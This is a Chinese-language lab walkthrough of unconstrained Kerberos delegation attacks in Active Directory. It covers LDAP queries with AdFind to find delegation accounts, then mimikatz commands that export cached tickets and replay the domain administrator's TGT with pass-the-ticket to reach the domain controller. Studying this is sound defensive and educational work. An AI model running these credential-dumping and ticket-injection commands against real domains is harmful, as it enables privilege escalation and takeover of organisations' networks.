## 前言

域委派分为三种：

第一种：约束委派

第二种：非约束委派

第三种、资源委派

>
> 用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的TGT发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务

## 非约束委派攻击

### 当前域环境

域控：`motoo\administrator`（192.168.2.42）  
域内主机（配置了非约束性委派）：`motoo\saulGoodman`（192.168.2.40）

### 非约束委派

首先创建一个非约束委派账户，注册`SPN`：

    
    
    setspn -U -A MSSQLSvc/mssql.motoo.nc:1433 saul
    

![](https://image.3001.net/images/20210819/1629344287_611dd21fb6812ca6cdbc8.jpg!small)然后需要把委派属性打开：  
![](https://image.3001.net/images/20210819/1629344288_611dd220d1dbe1e125ab9.jpg!small)当服务账号或者主机被设置为非约束性委派时，其`userAccountControl`属性会包含`TRUSTED_FOR_DELEGATION`：  
![](https://image.3001.net/images/20210819/1629344290_611dd2225c6241a5a41fc.jpg!small)![](https://image.3001.net/images/20210819/1629344291_611dd223b2316b2f80ef6.jpg!small)

### 查找域内非约束委派用户和计算机

发现域内主机主机我一般是使用`LDAP`，可以使用如下方式：  
Adfind 下载地址：https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml

    
    
    Adfind 使用参数：
    AdFind [switches] [-b basedn] [-f filter] [attr list]
    -b：指定要查询的根节点
    -f：LDAP过滤条件
    attr list：需要显示的属性
    

例如需要查询当前域内的非约束委派用户：

    
    
    AdFind.exe -b "DC=motoo,DC=nc" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
    

![](https://image.3001.net/images/20210819/1629344292_611dd224a46d7e2f1fb6c.jpg!small)  
可以看到`saul`这个用户就是域内非约束委派用户！  
查找非约束委派用户的工具还有很多！例如 Adfind、ldapdomaindump、PowerView ... 等等，我最常用的只有`Adfind`。

### 非约束委派攻击利用

![](https://image.3001.net/images/20210819/1629344293_611dd225add4fd7f5342b.jpg!small)  
非约束委派：当`user`访问`service1`时，如果`service1`的服务账号开启了`unconstrained
delegation`（非约束委派），则当`user`访问`service1`时会将`user`的`TGT`发送给`service1`并保存在内存中以备下次重用，然后`service1`就可以利用这张`TGT`以`user
`的身份去访问域内的任何服务（任何服务是指`user`能访问的服务）  
流程如下:

> 用户向KDC请求可转发TGT，记为TGT1
>
> KDC返回TGT1
>
> 用户通过TGT1向KDC请求转发TGT2
>
> KDC返回TGT2
>
> 用户通过TGT1向KDC申请访问服务1的RST
>
> KDC返回RST
>
> 用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1
>
> 服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）
>
> KDC给服务1返回服务2的RST
>
> 服务1以用户名义向服务2发出请求
>
> 服务2响应服务1的请求
>
> 服务1响应用户第7步骤的请求

这个流程有一个问题：`TGT2`是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。攻击其实就是利用的这点，使用从高权限账户处得到的`TGT`去获取权限。

    
    
    当前域：motoo.nc
    域控主机名：Motoo-DCSRV（IP：192.168.2.42）、用户 motoo\administrator	（win2008）
    域内主机名：Motoo-IISWEB（IP：192.168.2.40）、用户 motoo\saulGoodman   （win2012 R2）
    

在 Windows 系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的！  
现在我们将`Motoo-DBSRV`这个主机用户设置为非约束委派（注意是：主机用户而不是服务用户）  
![](https://image.3001.net/images/20210819/1629344294_611dd226d0dfa878e8fdf.jpg!small)当`Motoo-DBSRV`机器上设置了非约束委派。使用`dc`或者域管，去登录`Motoo-DBSRV`，可在`Motoo-DBSRV`上留存票据凭证，然后需要让域控模拟访问被设置了非约束委派的机器：

    
    
    Enter-PSSession -ComputerName Motoo-IISWeb
    

![](https://image.3001.net/images/20210819/1629344295_611dd227ed46aaa6bf3ba.jpg!small)注意：如果遇到这种情况需要开启`wmirm`端口：（原因是`wmi`版本太老了，需要加`-Port`指定端口，老版本的`wmi`端口是`80`）  
![](https://image.3001.net/images/20210819/1629344296_611dd228df49c8fed02a4.jpg!small)使用命令行打开`wmi`服务：（需要管理员权限）:

    
    
    WinRM QuickConfig  (y)
    

![](https://image.3001.net/images/20210819/1629344297_611dd229e856feb23c055.jpg!small)又或者`services.msc`手动打开：  
![](https://image.3001.net/images/20210819/1629344298_611dd22adec8fd04330f5.jpg!small)配置好后查看是否有回显，如果有就说明开启成功了：

    
    
    winrm enumerate winrm/config/listener
    

![](https://image.3001.net/images/20210819/1629344300_611dd22c4d0527e7150d9.jpg!small)域控模拟访问被设置了约束委派的机器后，这个时候其实域管理员的`TGT`已经缓存在`Motoo-IISWeb`机器上了。  
先清除一下当前票据缓存：

    
    
    mimikatz "privilege::debug" "kerberos::purge" "exit"
    

![](https://image.3001.net/images/20210819/1629344301_611dd22d4933a4c47325b.jpg!small)然后我们就可以使用`mimikatz`即`dump`所有票据出来：

    
    
    privilege::debug 
    sekurlsa::tickets /export
    

![](https://image.3001.net/images/20210819/1629344302_611dd22e713a5888da406.jpg!small)这个时候`[0;15ac7e]-2-0-40e00000-Administrator@krbtgt-MOTOO.NC.kirbi`就是域管理`administrator`的`TGT`！  
我们现在访问域控肯定是访问不了的：  
![](https://image.3001.net/images/20210819/1629344303_611dd22fdb068225c7d4f.jpg!small)这个时候就就需要通过`ptt`将`TGT`注入到当前会话中：

    
    
    kerberos::ptt [0;15ac7e]-2-0-40e00000-Administrator@krbtgt-MOTOO.NC.kirbi
    

![](https://image.3001.net/images/20210819/1629344304_611dd230995d2110cfd08.jpg!small)这个时候就能访问到域控了：  
![](https://image.3001.net/images/20210819/1629344305_611dd231a60514afff7d8.jpg!small)

  

